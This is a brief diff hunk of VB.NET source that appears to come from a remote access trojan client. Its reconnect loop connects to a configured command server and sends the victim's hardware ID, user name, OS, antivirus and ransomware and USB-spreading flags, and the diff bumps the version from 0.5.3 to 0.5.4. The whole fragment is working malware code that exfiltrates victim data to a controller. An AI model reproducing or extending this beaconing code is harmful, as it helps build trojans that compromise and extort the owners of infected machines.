@@ -96,7 +96,7 @@ e:      ' clear things and ReConnect
             C.Client.Connect(Settings.HOST, Settings.PORT)
             CN = True
             'Send info to server
-            Send("info" & SPL & ID.HWID & SPL & ID.UserName & SPL & IO.Path.GetFileName(Application.ExecutablePath) & SPL & "v0.5.3" & SPL & ID.MyOS & " " & ID.Bit & SPL & ID.INDATE & SPL & ID.AV & SPL & ID.Ransomeware & SPL & ID.USBSP & SPL & " ")
+            Send("info" & SPL & ID.HWID & SPL & ID.UserName & SPL & IO.Path.GetFileName(Application.ExecutablePath) & SPL & "v0.5.4" & SPL & ID.MyOS & " " & ID.Bit & SPL & ID.INDATE & SPL & ID.AV & SPL & ID.Ransomeware & SPL & ID.USBSP & SPL & " ")
         Catch ex As Exception
             Threading.Thread.CurrentThread.Sleep(2500)
             GoTo e
